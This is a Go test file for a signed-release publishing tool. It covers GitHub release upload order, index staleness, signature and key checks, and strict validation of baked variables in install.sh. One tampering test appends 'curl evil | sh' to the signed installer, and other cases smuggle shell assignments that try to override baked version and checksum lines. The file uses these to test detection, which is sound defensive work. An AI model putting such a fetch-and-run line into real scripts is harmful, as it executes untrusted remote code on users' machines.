//nolint:gosec // test code: every path is in a directory the test made
package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/knt048/vedette/internal/release"
)

// bakeInstaller writes install.sh with its three baked lines (as part A does) and signs it with the trusted comment comment.
func bakeInstaller(t *testing.T, r *rig, dir string, in Inputs, version, comment string) {
	t.Helper()
	sums := map[string]string{}
	for _, f := range in.Host.Files {
		sum, _, err := hashFile(f)
		must(t, err)
		_, arch, _ := release.ParseHostPackageName(filepath.Base(f))
		sums[arch] = sum
	}
	sh := "#!/bin/sh\nset -eu\nVEDETTE_VERSION=\"" + version + "\"\nVEDETTE_DEB_SHA256_AMD64=\"" + sums["amd64"] + "\"\nVEDETTE_DEB_SHA256_ARM64=\"" + sums["arm64"] + "\"\necho install\n"
	must(t, os.WriteFile(filepath.Join(dir, installer), []byte(sh), 0o600))
	must(t, testSigner{t, r.active}.SignFile(context.Background(), filepath.Join(dir, installer), filepath.Join(dir, installerSig), comment))
}

// signedRelease builds a signed, verified release directory (with the container assets and a baked, signed install.sh) on top of
// the published index in prevDir ("" for the first release).
func signedRelease(t *testing.T, r *rig, version, prevDir string) (string, *Summary, *Inputs) {
	t.Helper()
	var in Inputs
	assets := writeAssets(t)
	dir, err := r.build(buildOpts{version: version, channel: "stable", cur: addOnlyTree, services: []string{"core", "sensor", "scan"}, installModes: bothModes, prevDir: prevDir,
		beforeSign: func(dir string, x Inputs) {
			assets(dir, x)
			in = x
			bakeInstaller(t, r, dir, x, version, "file:install.sh version:"+version)
		}})
	must(t, err)
	s, err := VerifyDir(dir, prevDir, r.trust)
	must(t, err)
	return dir, s, &in
}

// ghFake is GitHub releases in memory: view, create, upload, edit, download.
type ghFake struct {
	rel         map[string]*ghRelease
	blobs       map[string]map[string][]byte
	noTag       bool
	corrupt     string // an uploaded asset of this name gets another digest
	noDigest    bool   // GitHub reports no digest (older assets)
	badDownload string // a download of this asset returns other bytes
}

func newGH() *ghFake {
	return &ghFake{rel: map[string]*ghRelease{indexTag: {Assets: []ghAsset{}}}, blobs: map[string]map[string][]byte{}}
}

func (g *ghFake) put(tag, name string, b []byte) {
	r := g.rel[tag]
	h := sha256.Sum256(b)
	d := "sha256:" + hex.EncodeToString(h[:])
	if name == g.corrupt {
		d = digestOf("other")
	}
	a := ghAsset{Name: name, Size: int64(len(b)), Digest: &d, State: "uploaded"}
	if g.noDigest {
		a.Digest = nil
	}
	r.Assets = slices.DeleteFunc(r.Assets, func(x ghAsset) bool { return x.Name == name })
	r.Assets = append(r.Assets, a)
	if g.blobs[tag] == nil {
		g.blobs[tag] = map[string][]byte{}
	}
	g.blobs[tag][name] = b
}

// seedIndex publishes the index of dir on the release "index", as an earlier release did.
func (g *ghFake) seedIndex(t *testing.T, dir string) {
	for _, n := range []string{indexFile, indexFile + ".minisig"} {
		b, err := os.ReadFile(filepath.Join(dir, n))
		must(t, err)
		g.put(indexTag, n, b)
	}
}

func (g *ghFake) fn(argv []string) ([]byte, error) {
	a := strings.Join(argv, " ")
	if strings.HasPrefix(a, "git -C repo rev-parse --verify --quiet refs/tags/") {
		if g.noTag {
			return nil, errors.New("exit status 1")
		}
		return []byte("abc\n"), nil
	}
	if len(argv) < 4 || argv[0] != "gh" || argv[1] != "release" {
		return nil, errors.New("unexpected " + a)
	}
	tag := argv[3]
	r := g.rel[tag]
	if r == nil && argv[2] != "create" {
		return nil, errors.New("gh release " + argv[2] + ": exit status 1: release not found")
	}
	switch argv[2] {
	case "view":
		return json.Marshal(r)
	case "create":
		if !slices.Contains(argv, "--verify-tag") || !slices.Contains(argv, "--draft") || !slices.Contains(argv, "--notes-file") {
			return nil, errors.New("create without --verify-tag --draft --notes-file")
		}
		g.rel[tag] = &ghRelease{IsDraft: true}
		return nil, nil
	case "upload":
		for _, f := range argv[7:] { // gh release upload <tag> --repo R --clobber <files>
			b, err := os.ReadFile(f)
			if err != nil {
				return nil, err
			}
			g.put(tag, filepath.Base(f), b)
		}
		return nil, nil
	case "edit":
		if slices.Contains(argv, "--draft=false") {
			r.IsDraft = false
		}
		return nil, nil
	case "download":
		dir := argv[slices.Index(argv, "--dir")+1]
		for i, x := range argv {
			if x != "--pattern" {
				continue
			}
			n := argv[i+1]
			b := g.blobs[tag][n]
			if n == g.badDownload {
				b = []byte("other bytes")
			}
			if err := os.WriteFile(filepath.Join(dir, n), b, 0o600); err != nil {
				return nil, err
			}
		}
		return nil, nil
	}
	return nil, errors.New("unexpected " + a)
}

// ghcr answers HEAD of a manifest with status (200: public).
func ghcr(t *testing.T, status int) registryHTTP {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/token" {
			_, _ = w.Write([]byte(`{"token":"anon"}`))
			return
		}
		if r.Method != http.MethodHead || !strings.HasPrefix(r.URL.Path, "/v2/knt048/vedette-") || r.Header.Get("Authorization") != "Bearer anon" ||
			!strings.Contains(r.Header.Get("Accept"), "application/vnd.oci.image.index.v1+json") {
			w.WriteHeader(http.StatusBadRequest)
			return
		}
		w.WriteHeader(status)
	}))
	t.Cleanup(srv.Close)
	return registryHTTP{base: srv.URL, client: srv.Client()}
}

func env(g *ghFake, r *rig, reg registryHTTP, prevDir string, first bool) (publishEnv, *fakeRun) {
	fr := &fakeRun{fn: g.fn}
	return publishEnv{run: fr.run, reg: reg, repo: "repo", trust: r.trust, prevDir: prevDir, firstRelease: first, stdout: &bytes.Buffer{}}, fr
}

func TestPublishPrintsTheOrder(t *testing.T) {
	r := newRig(t)
	dir, s, in := signedRelease(t, r, "0.2.0", "")
	p, err := planPublish(dir, s, in, r.trust)
	must(t, err)
	want := []string{"release-manifest.json", "release-manifest.json.minisig", "install.sh", "install.sh.minisig",
		"compose.yaml", "compose.yaml.minisig", "compose.sensors.yaml", "compose.sensors.yaml.minisig", "compose.syslog.yaml",
		"compose.syslog.yaml.minisig", "vedette.env", "vedette.env.minisig", "vedette-host_0.2.0_amd64.deb", "vedette-host_0.2.0_arm64.deb"}
	if got := baseNames(p.Assets); !slices.Equal(got, want) {
		t.Errorf("assets %v", got)
	}
	if got := baseNames(p.Index); !slices.Equal(got, []string{"index.json", "index.json.minisig"}) {
		t.Errorf("index %v", got)
	}
	e, fr := env(newGH(), r, registryHTTP{}, "", true)
	var out bytes.Buffer
	e.stdout = &out
	must(t, Publish(context.Background(), e, p, false))
	var cmds []string
	for _, l := range strings.Split(strings.TrimSpace(out.String()), "\n") {
		if !strings.HasPrefix(l, "#") {
			cmds = append(cmds, l)
		}
	}
	notes := filepath.Join(dir, "release-notes.md")
	if len(cmds) != 4 || cmds[0] != "gh release create v0.2.0 --repo KNT048/vedette --verify-tag --draft --title 'Vedette 0.2.0' --notes-file "+notes ||
		!strings.HasPrefix(cmds[1], "gh release upload v0.2.0 --repo KNT048/vedette --clobber") || cmds[2] != "gh release edit v0.2.0 --repo KNT048/vedette --draft=false" ||
		!strings.HasPrefix(cmds[3], "gh release upload index --repo KNT048/vedette --clobber") {
		t.Errorf("printed:\n%s", out.String())
	}
	if b, err := os.ReadFile(notes); err != nil || string(b) != "Test release & <notes>\n" {
		t.Errorf("notes file %q %v", b, err)
	}
	if len(fr.calls) != 1 || fr.calls[0][0] != "git" {
		t.Errorf("printing runs nothing but the tag lookup: %v", fr.joined())
	}
}

func isIndexUpload(c string) bool { return strings.HasPrefix(c, "gh release upload index") }

func TestPublishRun(t *testing.T) {
	r := newRig(t)
	dir, s, in := signedRelease(t, r, "0.2.0", "")
	p, err := planPublish(dir, s, in, r.trust)
	must(t, err)

	t.Run("first release: draft, upload, check, pull check, publish, then the index last", func(t *testing.T) {
		g := newGH()
		e, fr := env(g, r, ghcr(t, http.StatusOK), "", true)
		must(t, Publish(context.Background(), e, p, true))
		calls := fr.joined()
		ix := slices.IndexFunc(calls, isIndexUpload)
		ed := slices.IndexFunc(calls, func(c string) bool { return strings.HasPrefix(c, "gh release edit v0.2.0") })
		if ix < 0 || ed < 0 || ix < ed || ix != len(calls)-2 { // the index upload, then its read-back
			t.Errorf("order: %v", calls)
		}
		if g.rel["v0.2.0"].IsDraft || len(g.rel["v0.2.0"].Assets) != len(p.Assets) || len(g.rel[indexTag].Assets) != 2 {
			t.Errorf("%+v %+v", g.rel["v0.2.0"], g.rel[indexTag])
		}
		// the next release builds on this index: -prev-index equal to the live one, the published v0.2.0 untouched
		dir2, s2, in2 := signedRelease(t, r, "0.3.0", dir)
		p2, err := planPublish(dir2, s2, in2, r.trust)
		must(t, err)
		e2, fr2 := env(g, r, ghcr(t, http.StatusOK), dir, false)
		must(t, Publish(context.Background(), e2, p2, true))
		if slices.ContainsFunc(fr2.joined(), func(c string) bool { return strings.Contains(c, " v0.2.0 ") }) {
			t.Errorf("%v", fr2.joined())
		}
		// a run again of 0.3.0 finds its own index live: it checks the assets and uploads nothing
		e3, fr3 := env(g, r, ghcr(t, http.StatusOK), dir, false)
		var out3 bytes.Buffer
		e3.stdout = &out3
		must(t, Publish(context.Background(), e3, p2, true))
		if slices.ContainsFunc(fr3.joined(), func(c string) bool {
			return strings.HasPrefix(c, "gh release upload") || strings.HasPrefix(c, "gh release create") || strings.HasPrefix(c, "gh release edit")
		}) || !strings.Contains(out3.String(), "already this release's") {
			t.Errorf("%v\n%s", fr3.joined(), out3.String())
		}
		// another 0.3.0 built on the same -prev-index is stale now: the live index is neither its own nor -prev-index
		dirB, sB, inB := signedRelease(t, r, "0.3.0", dir)
		pB, err := planPublish(dirB, sB, inB, r.trust)
		must(t, err)
		eB, frB := env(g, r, ghcr(t, http.StatusOK), dir, false)
		if err := Publish(context.Background(), eB, pB, true); err == nil || !strings.Contains(err.Error(), "differs from -prev-index") {
			t.Errorf("stale -prev-index: %v", err)
		}
		if slices.ContainsFunc(frB.joined(), func(c string) bool {
			return strings.HasPrefix(c, "gh release upload") || strings.HasPrefix(c, "gh release create")
		}) {
			t.Errorf("%v", frB.joined())
		}
	})
	t.Run("a half-replaced live index points at the manual fix", func(t *testing.T) {
		dir2, s2, in2 := signedRelease(t, r, "0.3.0", dir)
		p2, err := planPublish(dir2, s2, in2, r.trust)
		must(t, err)
		g := newGH()
		g.seedIndex(t, dir)                                 // 0.2.0's index and signature ...
		b, _ := os.ReadFile(filepath.Join(dir2, indexFile)) // ... then only the new index.json went up
		g.put(indexTag, indexFile, b)
		e, fr := env(g, r, ghcr(t, http.StatusOK), dir, false)
		if err := Publish(context.Background(), e, p2, true); err == nil || !strings.Contains(err.Error(), `row "publish 7"`) {
			t.Fatalf("%v", err)
		}
		if slices.ContainsFunc(fr.joined(), func(c string) bool { return strings.HasPrefix(c, "gh release upload") }) {
			t.Errorf("%v", fr.joined())
		}
	})
	t.Run("a draft left by a failed run is filled again", func(t *testing.T) {
		g := newGH()
		g.rel["v0.2.0"] = &ghRelease{IsDraft: true}
		e, fr := env(g, r, ghcr(t, http.StatusOK), "", true)
		must(t, Publish(context.Background(), e, p, true))
		if slices.ContainsFunc(fr.joined(), func(c string) bool { return strings.HasPrefix(c, "gh release create") }) || g.rel["v0.2.0"].IsDraft {
			t.Errorf("%v", fr.joined())
		}
	})
	t.Run("no digest from GitHub: the asset is downloaded and hashed", func(t *testing.T) {
		g := newGH()
		g.noDigest = true
		e, fr := env(g, r, ghcr(t, http.StatusOK), "", true)
		must(t, Publish(context.Background(), e, p, true))
		if !slices.ContainsFunc(fr.joined(), func(c string) bool { return strings.HasPrefix(c, "gh release download v0.2.0") }) {
			t.Errorf("%v", fr.joined())
		}
		g2 := newGH()
		g2.noDigest, g2.badDownload = true, "vedette.env"
		e2, fr2 := env(g2, r, ghcr(t, http.StatusOK), "", true)
		if err := Publish(context.Background(), e2, p, true); err == nil || !strings.Contains(err.Error(), "the downloaded vedette.env is not the verified file") {
			t.Fatalf("%v", err)
		}
		if slices.ContainsFunc(fr2.joined(), func(c string) bool { return strings.HasPrefix(c, "gh release edit") || isIndexUpload(c) }) {
			t.Errorf("%v", fr2.joined())
		}
	})

	otherDir, _, _ := signedRelease(t, r, "0.2.0", "") // another build: its index is not this run's
	refusals := map[string]struct {
		setup     func(g *ghFake) (prev string, first bool)
		pull      int
		want      string
		published bool // the version release may have been published (only the index step refused)
	}{
		"no tag":                     {setup: func(g *ghFake) (string, bool) { g.noTag = true; return "", true }, want: "no tag v0.2.0"},
		"no index release":           {setup: func(g *ghFake) (string, bool) { delete(g.rel, indexTag); return "", true }, want: `no published release "index"`},
		"not first but no index yet": {setup: func(*ghFake) (string, bool) { return "", false }, want: "only the first release"},
		"first but an index is live": {setup: func(g *ghFake) (string, bool) { g.seedIndex(t, otherDir); return "", true }, want: "already has an index.json"},
		"no -prev-index":             {setup: func(g *ghFake) (string, bool) { g.seedIndex(t, otherDir); return "", false }, want: "needs -prev-index"},
		"upload corrupted":           {setup: func(g *ghFake) (string, bool) { g.corrupt = "vedette.env"; return "", true }, want: "still a draft"},
		"package private":            {setup: func(*ghFake) (string, bool) { return "", true }, pull: http.StatusUnauthorized, want: "make the package public"},
		"published and changed": {setup: func(g *ghFake) (string, bool) {
			g.rel["v0.2.0"] = &ghRelease{Assets: []ghAsset{{Name: "release-manifest.json", Size: 1, State: "uploaded"}}}
			return "", true
		}, want: "never changed", published: true},
		"a stray asset on the draft": {setup: func(g *ghFake) (string, bool) {
			g.rel["v0.2.0"] = &ghRelease{IsDraft: true}
			g.put("v0.2.0", "notes.txt", []byte("x"))
			return "", true
		}, want: "gh release delete-asset v0.2.0 notes.txt --repo KNT048/vedette"},
	}
	for name, c := range refusals {
		t.Run(name, func(t *testing.T) {
			g := newGH()
			prev, first := c.setup(g)
			pull := c.pull
			if pull == 0 {
				pull = http.StatusOK
			}
			e, fr := env(g, r, ghcr(t, pull), prev, first)
			err := Publish(context.Background(), e, p, true)
			if err == nil || !strings.Contains(err.Error(), c.want) {
				t.Fatalf("got %v, want %q", err, c.want)
			}
			calls := fr.joined()
			if slices.ContainsFunc(calls, isIndexUpload) {
				t.Errorf("the index went up: %v", calls)
			}
			if !c.published && slices.ContainsFunc(calls, func(c string) bool { return strings.HasPrefix(c, "gh release edit") }) {
				t.Errorf("the release was published: %v", calls)
			}
		})
	}
	t.Run("a file changed after it was verified", func(t *testing.T) {
		dir, s, in := signedRelease(t, r, "0.2.0", "")
		p, err := planPublish(dir, s, in, r.trust)
		must(t, err)
		must(t, os.WriteFile(filepath.Join(dir, "compose.yaml"), []byte("# changed\n"), 0o600))
		e, fr := env(newGH(), r, ghcr(t, http.StatusOK), "", true)
		if err := Publish(context.Background(), e, p, true); err == nil || !strings.Contains(err.Error(), "changed since it was verified") {
			t.Fatalf("%v", err)
		}
		if slices.ContainsFunc(fr.joined(), func(c string) bool { return strings.HasPrefix(c, "gh release upload") }) {
			t.Errorf("%v", fr.joined())
		}
	})
}

// installerCase signs dir's install.sh after edit changed it, and runs checkInstaller with the signed manifest of dir (mut may
// change that manifest first).
func installerCase(t *testing.T, r *rig, dir string, edit func(string) string, mut func(*release.Manifest)) error {
	t.Helper()
	p := filepath.Join(dir, installer)
	b, err := os.ReadFile(p)
	must(t, err)
	must(t, os.WriteFile(p, []byte(edit(string(b))), 0o600))
	must(t, testSigner{t, r.active}.SignFile(context.Background(), p, p+".minisig", "file:install.sh version:0.2.0"))
	raw, err := os.ReadFile(filepath.Join(dir, manifestFile))
	must(t, err)
	var m release.Manifest
	must(t, json.Unmarshal(raw, &m))
	if mut != nil {
		mut(&m)
	}
	_, _, err = checkInstaller(dir, &m, r.trust.Active.KeyID(), r.trust)
	return err
}

// TestCheckInstallerStrictLines: any line that can set a baked variable must be exactly the baked line (the rule of checkEnvImages),
// whatever shell form it takes; and a manifest without one of the two packages is refused instead of baking an empty checksum.
func TestCheckInstallerStrictLines(t *testing.T) {
	r := newRig(t)
	appendLine := func(l string) func(string) string { return func(s string) string { return s + l + "\n" } }
	cases := map[string]func(string) string{
		"indented":              appendLine(`  VEDETTE_VERSION="0.2.0"`),
		"export":                appendLine(`export VEDETTE_VERSION="9.9.9"`),
		"readonly":              appendLine(`readonly VEDETTE_DEB_SHA256_AMD64="` + strings.Repeat("0", 64) + `"`),
		"local in a function":   appendLine(`f() { local VEDETTE_VERSION=9.9.9; }`),
		"append":                appendLine(`VEDETTE_VERSION+="-evil"`),
		"default assign":        appendLine(`: ${VEDETTE_VERSION:=9.9.9}`),
		"default assign no :":   appendLine(`: ${VEDETTE_DEB_SHA256_ARM64=abc}`),
		"after another command": appendLine(`true; VEDETTE_VERSION="9.9.9"`),
		"BOM":                   appendLine(bom + `VEDETTE_VERSION="0.2.0"`),
		"CRLF baked line": func(s string) string {
			return strings.Replace(s, `VEDETTE_VERSION="0.2.0"`+"\n", `VEDETTE_VERSION="0.2.0"`+"\r\n", 1)
		},
		"spaces around =": appendLine(`VEDETTE_VERSION = "9.9.9"`),
	}
	for name, edit := range cases {
		t.Run(name, func(t *testing.T) {
			dir, _, _ := signedRelease(t, r, "0.2.0", "")
			if err := installerCase(t, r, dir, edit, nil); err == nil || !strings.Contains(err.Error(), "sets VEDETTE_") {
				t.Fatalf("got %v", err)
			}
		})
	}
	t.Run("a manifest with one architecture", func(t *testing.T) {
		dir, _, _ := signedRelease(t, r, "0.2.0", "")
		err := installerCase(t, r, dir, func(s string) string { return s }, func(m *release.Manifest) { m.Host.Files = m.Host.Files[:1] })
		if err == nil || !strings.Contains(err.Error(), "amd64 and arm64") {
			t.Fatalf("got %v", err)
		}
	})
	t.Run("uses of the variables are not assignments", func(t *testing.T) {
		dir, _, _ := signedRelease(t, r, "0.2.0", "")
		uses := appendLine(`[ -n "$VEDETTE_VERSION" ] || die "x"; case $ARCH in amd64) DEB_SUM=$VEDETTE_DEB_SHA256_AMD64 ;; esac; RELEASE=${VEDETTE_VERSION:-}`)
		must(t, installerCase(t, r, dir, uses, nil))
	})
}

// TestCheckInstallerOnTheRealScript: the repository's install.sh with its three lines filled the way part A fills them passes; no use
// of the variables in it is taken for an assignment.
func TestCheckInstallerOnTheRealScript(t *testing.T) {
	r := newRig(t)
	dir, _, _ := signedRelease(t, r, "0.2.0", "")
	script, err := os.ReadFile("../../install.sh")
	must(t, err)
	baked, err := os.ReadFile(filepath.Join(dir, installer)) // the fixture's three lines, with the packages' hashes
	must(t, err)
	lines := map[string]string{}
	for _, l := range strings.Split(string(baked), "\n") {
		for _, n := range bakedNames {
			if strings.HasPrefix(l, n+"=") {
				lines[n] = l
			}
		}
	}
	s := string(script)
	for _, n := range bakedNames {
		if !strings.Contains(s, "\n"+n+"=\"\"\n") {
			t.Fatalf("install.sh has no empty line %s=\"\"", n)
		}
		s = strings.Replace(s, "\n"+n+"=\"\"\n", "\n"+lines[n]+"\n", 1)
	}
	must(t, installerCase(t, r, dir, func(string) string { return s }, nil))
}

// TestPlanPublishRecordsTheVerifiedInstaller: the record of install.sh is of the bytes checkInstaller verified.
func TestPlanPublishRecordsTheVerifiedInstaller(t *testing.T) {
	r := newRig(t)
	dir, s, in := signedRelease(t, r, "0.2.0", "")
	p, err := planPublish(dir, s, in, r.trust)
	must(t, err)
	raw, sig, err := checkInstaller(dir, mustManifest(t, dir), r.trust.Active.KeyID(), r.trust)
	must(t, err)
	if p.Record[installer] != (fileRecord{strings.TrimPrefix(digestBytes(raw), "sha256:"), int64(len(raw))}) ||
		p.Record[installerSig] != (fileRecord{strings.TrimPrefix(digestBytes(sig), "sha256:"), int64(len(sig))}) {
		t.Errorf("%+v", p.Record)
	}
	must(t, os.WriteFile(filepath.Join(dir, installer), append(raw, '\n'), 0o600))
	if err := p.checkLocal(p.Assets); err == nil || !strings.Contains(err.Error(), "changed since it was verified") {
		t.Errorf("%v", err)
	}
}

func mustManifest(t *testing.T, dir string) *release.Manifest {
	raw, err := os.ReadFile(filepath.Join(dir, manifestFile))
	must(t, err)
	var m release.Manifest
	must(t, json.Unmarshal(raw, &m))
	return &m
}

func TestPlanPublishRefusals(t *testing.T) {
	r := newRig(t)
	other := newRig(t)
	cases := map[string]struct {
		mut  func(dir string, in *Inputs, s *Summary)
		want string
	}{
		"no install.sh":         {func(d string, _ *Inputs, _ *Summary) { must(t, os.Remove(filepath.Join(d, installer))) }, "release-bake-install"},
		"no install.sh.minisig": {func(d string, _ *Inputs, _ *Summary) { must(t, os.Remove(filepath.Join(d, installerSig))) }, "release-bake-install"},
		"install.sh changed after signing": {func(d string, _ *Inputs, _ *Summary) {
			f, err := os.OpenFile(filepath.Join(d, installer), os.O_APPEND|os.O_WRONLY, 0)
			must(t, err)
			_, _ = f.WriteString("curl evil | sh\n")
			must(t, f.Close())
		}, "install.sh"},
		"install.sh of another release": {func(d string, in *Inputs, _ *Summary) {
			bakeInstaller(t, r, d, *in, "0.2.0", "file:install.sh version:0.1.0")
		}, "trusted comment"},
		"install.sh comment of another file": {func(d string, in *Inputs, _ *Summary) {
			bakeInstaller(t, r, d, *in, "0.2.0", "file:compose.yaml version:0.2.0")
		}, "trusted comment"},
		"install.sh signed by the backup key": {func(d string, in *Inputs, _ *Summary) {
			bakeInstaller(t, r, d, *in, "0.2.0", "file:install.sh version:0.2.0")
			must(t, testSigner{t, r.backup}.SignFile(context.Background(), filepath.Join(d, installer), filepath.Join(d, installerSig), "file:install.sh version:0.2.0"))
		}, "the manifest by"},
		"install.sh signed by another key": {func(d string, _ *Inputs, _ *Summary) {
			must(t, testSigner{t, other.active}.SignFile(context.Background(), filepath.Join(d, installer), filepath.Join(d, installerSig), "file:install.sh version:0.2.0"))
		}, "install.sh"},
		"baked version wrong": {func(d string, in *Inputs, _ *Summary) {
			bakeInstaller(t, r, d, *in, "0.1.9", "file:install.sh version:0.2.0")
		}, `"VEDETTE_VERSION=\"0.1.9\"" sets VEDETTE_VERSION`},
		"baked sha256 wrong": {func(d string, in *Inputs, _ *Summary) {
			x := *in
			x.Host = &HostIn{Version: "0.2.0", Files: []string{in.Host.Files[1], in.Host.Files[1]}}
			bakeInstaller(t, r, d, x, "0.2.0", "file:install.sh version:0.2.0")
		}, "VEDETTE_DEB_SHA256_"},
		"baked line twice": {func(d string, in *Inputs, _ *Summary) {
			bakeInstaller(t, r, d, *in, "0.2.0", "file:install.sh version:0.2.0")
			b, _ := os.ReadFile(filepath.Join(d, installer))
			must(t, os.WriteFile(filepath.Join(d, installer), append(b, "VEDETTE_VERSION=\"0.2.0\"\n"...), 0o600))
			must(t, testSigner{t, r.active}.SignFile(context.Background(), filepath.Join(d, installer), filepath.Join(d, installerSig), "file:install.sh version:0.2.0"))
		}, "2 times"},
		"package rebuilt": {func(_ string, in *Inputs, _ *Summary) {
			must(t, os.WriteFile(in.Host.Files[1], []byte("other"), 0o600))
		}, "not the package the signed manifest names"},
		"package not described":  {func(_ string, in *Inputs, _ *Summary) { in.Host.Files = in.Host.Files[:1] }, "names no vedette-host_0.2.0_arm64.deb"},
		"description of another": {func(_ string, in *Inputs, _ *Summary) { in.Version = "0.2.1" }, "release.in.json is for"},
		"a container file gone": {func(d string, _ *Inputs, _ *Summary) {
			must(t, os.Remove(filepath.Join(d, "compose.yaml.minisig")))
		}, "compose.yaml.minisig is missing"},
		"a symlink": {func(d string, _ *Inputs, _ *Summary) {
			p := filepath.Join(d, "compose.yaml")
			must(t, os.Rename(p, p+".real"))
			must(t, os.Symlink(p+".real", p))
		}, "a symlink is refused"},
		"a test version": {func(_ string, _ *Inputs, s *Summary) { s.Version = "0.2.0-test.1" }, "-test."},
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			dir, s, in := signedRelease(t, r, "0.2.0", "")
			c.mut(dir, in, s)
			if _, err := planPublish(dir, s, in, r.trust); err == nil || !strings.Contains(err.Error(), c.want) {
				t.Fatalf("got %v, want %q", err, c.want)
			}
		})
	}
}

func TestRequireProductionSigners(t *testing.T) {
	r, other := newRig(t), newRig(t)
	dir, s, in := signedRelease(t, r, "0.2.0", "")
	p, err := planPublish(dir, s, in, r.trust)
	must(t, err)
	if p.ManifestKeyID != r.trust.Active.KeyID() || p.IndexKeyID != r.trust.Active.KeyID() {
		t.Fatalf("%+v", p)
	}
	must(t, requireProductionSigners(p, r.trust, r.trust))
	if err := requireProductionSigners(p, r.trust, other.trust); err == nil || !strings.Contains(err.Error(), "not the production key") {
		t.Errorf("signed by keys of -keys-dir, not the compiled-in ones: %v", err)
	}
	test := r.trust
	test.TestOnly = true
	if err := requireProductionSigners(p, r.trust, test); err == nil || !strings.Contains(err.Error(), "throwaway") {
		t.Errorf("%v", err)
	}
	backup := *p
	backup.ManifestKeyID, backup.IndexKeyID = r.trust.Backup.KeyID(), r.trust.Backup.KeyID()
	if err := requireProductionSigners(&backup, r.trust, r.trust); err == nil {
		t.Error("the backup key signs only a rescue")
	}
	backup.Rescue = true
	must(t, requireProductionSigners(&backup, r.trust, r.trust))
}

// TestRequireProductionSignersComparesWholeKeys: a key id is 8 bytes its maker chooses; a -keys-dir key with the production id
// but another key, or another cosign key, is refused.
func TestRequireProductionSignersComparesWholeKeys(t *testing.T) {
	r, other := newRig(t), newRig(t)
	dir, s, in := signedRelease(t, r, "0.2.0", "")
	p, err := planPublish(dir, s, in, r.trust)
	must(t, err)
	sameID := r.trust
	sameID.Active = release.MinisignKey{ID: r.trust.Active.ID, Key: other.trust.Active.Key}
	if sameID.Active.KeyID() != p.IndexKeyID {
		t.Fatal("the forged key must carry the production id")
	}
	if err := requireProductionSigners(p, sameID, r.trust); err == nil || !strings.Contains(err.Error(), "not the production key") {
		t.Errorf("same id, other key: %v", err)
	}
	otherCosign := r.trust
	otherCosign.Cosign = other.trust.Cosign
	if err := requireProductionSigners(p, otherCosign, r.trust); err == nil || !strings.Contains(err.Error(), "cosign key") {
		t.Errorf("other cosign.pub: %v", err)
	}
	extra := r.trust
	extra.Cosign = append(slices.Clone(r.trust.Cosign), other.trust.Cosign...)
	if err := requireProductionSigners(p, extra, r.trust); err == nil {
		t.Error("a second, non-production cosign key in -keys-dir")
	}
}

func TestPublishRefreshIsTheIndexOnly(t *testing.T) {
	r := newRig(t)
	prev, _, _ := signedRelease(t, r, "0.2.0", "")
	dir := t.TempDir()
	for _, n := range []string{"index.json", "index.json.minisig"} {
		must(t, os.WriteFile(filepath.Join(dir, n), []byte(n), 0o600))
	}
	p, err := planPublish(dir, &Summary{IndexOnly: true, IndexKeyID: r.trust.Active.KeyID()}, nil, r.trust)
	must(t, err)
	if p.Version != "" || len(p.Assets) != 0 || len(p.Index) != 2 || len(p.Images) != 0 {
		t.Fatalf("%+v", p)
	}
	must(t, requireProductionSigners(p, r.trust, r.trust))
	g := newGH()
	g.seedIndex(t, prev)
	e, fr := env(g, r, registryHTTP{}, prev, false)
	must(t, Publish(context.Background(), e, p, true))
	calls := fr.joined()
	if slices.ContainsFunc(calls, func(c string) bool { return strings.HasPrefix(c, "git") || strings.Contains(c, " v0.") }) || calls[len(calls)-2] != "gh release upload index --repo KNT048/vedette --clobber "+strings.Join(p.Index, " ") {
		t.Errorf("%v", calls)
	}
}
